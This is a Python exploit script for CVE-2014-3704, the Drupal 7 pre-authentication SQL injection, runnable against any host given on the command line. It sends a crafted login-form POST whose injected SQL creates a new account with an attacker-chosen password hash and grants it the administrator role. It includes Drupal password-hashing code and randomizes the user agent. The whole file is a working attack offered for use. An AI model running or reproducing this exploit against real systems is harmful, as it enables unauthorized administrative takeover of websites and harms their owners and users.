#!/usr/bin/env python3

import argparse
import hashlib
import requests
import random

import logging

log = logging.getLogger(__name__)


class DrupalHash:
    def __init__(self, stored_hash, password):
        self.itoa64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        self.last_hash = self.rehash(stored_hash, password)

    def get_hash(self):
        return self.last_hash

    def password_get_count_log2(self, setting):
        return self.itoa64.index(setting[3])

    def password_crypt(self, algo, password, setting):
        setting = setting[0:12]
        if setting[0] != "$" or setting[2] != "$":
            return False

        count_log2 = self.password_get_count_log2(setting)
        salt = setting[4:12]
        if len(salt) < 8:
            return False
        count = 1 << count_log2

        if algo == "md5":
            hash_func = hashlib.md5
        elif algo == "sha512":
            hash_func = hashlib.sha512
        else:
            return False

        salt = bytes(setting[4:12], "utf-8")
        password = bytes(password, "utf-8")
        hash_str = hash_func(salt + password).digest()
        for c in range(count):
            hash_str = hash_func(hash_str + password).digest()
        output = setting + self.custom64(hash_str)
        return output

    def custom64(self, string, count=0):
        if count == 0:
            count = len(string)
        output = ""
        i = 0
        itoa64 = self.itoa64
        while 1:
            value = string[i]
            # value = ord(string[i])
            i += 1
            output += itoa64[value & 0x3F]
            if i < count:
                value |= string[i] << 8
                # value |= ord(string[i]) << 8
            output += itoa64[(value >> 6) & 0x3F]
            if i >= count:
                break
            i += 1
            if i < count:
                value |= string[i] << 16
                # value |= ord(string[i]) << 16
            output += itoa64[(value >> 12) & 0x3F]
            if i >= count:
                break
            i += 1
            output += itoa64[(value >> 18) & 0x3F]
            if i >= count:
                break
        return output

    def rehash(self, stored_hash, password):
        # Drupal 6 compatibility
        if len(stored_hash) == 32 and stored_hash.find("$") == -1:
            return hashlib.md5(password).hexdigest()
        # Drupal 7
        if stored_hash[0:2] == "U$":
            stored_hash = stored_hash[1:]
            password = hashlib.md5(password).hexdigest()
        hash_type = stored_hash[0:3]
        if hash_type == "$S$":
            hash_str = self.password_crypt("sha512", password, stored_hash)
        elif hash_type == "$H$" or hash_type == "$P$":
            hash_str = self.password_crypt("md5", password, stored_hash)
        else:
            hash_str = False
        return hash_str
        # END - from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py


class Drupal:
    def __init__(self):
        self.__host = None
        self.__port = 80
        self.__user = "defconisfun"
        self.__pw = "igotownedatdefcon"
        self.__target = None
        self.__hash = None
        self.__requests = requests.session()
        self.__requests.headers.update({"User-Agent": self.__randomAgentGen()})

    def __randomAgentGen(self):
        userAgent = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3",
        ]

        UA = random.choice(userAgent)
        return UA

    def __url(self):
        if self.__port == 443:
            url = f"https://{self.__host}/drupal"
        else:
            url = f"http://{self.__host}/drupal"
        url = url + "/?q=node&destination=node"
        return url

    def __exploit(self):
        # Add new user:
        # insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'admin', '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' FROM users
        #
        # Set administrator permission (rid = 3):
        # insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'admin'), 3)
        #
        payload = f"name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27{self.__user}%27,+%27{self.__hash[:55]}%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27{self.__user}%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"

        log.debug(f"[!] Starting Drupal exploit ({self.__host})")
        try:
            r = self.__requests.post(
                self.__target,
                data=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if "mb_strlen() expects parameter 1" in r.text:
                log.info(f"[!] Drupal is vulnerable ({self.__host})")
                return True
            else:
                log.info(f"[X] Exploit failed for some reason ({self.__host})")
                return False
        except requests.HTTPError as e:
            log.info(f"[X] HTTP Error: {e.reason} ({e.code}) ({self.__host})")
            return True
        except requests.URLError as e:
            log.info(f"[X] Connection error: {e.reason} ({self.__host})")
            return True
        except requests.ConnectTimeout as e:
            log.info(f"[X] Connection timed out: {e.reason} ({self.__host})")
        except Exception as e:
            log.info(f"[X] Exception: {e} ({self.__host})")

    def run(self, host, port=None, username=None, pwd=None):
        self.__host = host
        log.debug(f"[*] Exploiting Drupal ({self.__host})")
        if port:
            self.__port = port
        if username:
            self.__user = username
        if pwd:
            self.__pw = pwd
        self.__target = self.__url()
        self.__hash = DrupalHash(
            "$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", self.__pw
        ).get_hash()
        return self.__exploit()


def main(args):
    log.info("[+] Exploiting 2014-3704 by xentrick")
    log.info(f"[+] Exploiting {args.host}:{args.port}")

    exploit = Drupal()
    if exploit.run(args.host, args.port, args.user, args.pwd):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    parser.add_argument("user")
    parser.add_argument("pwd")
    args = parser.parse_args()

    main(args)
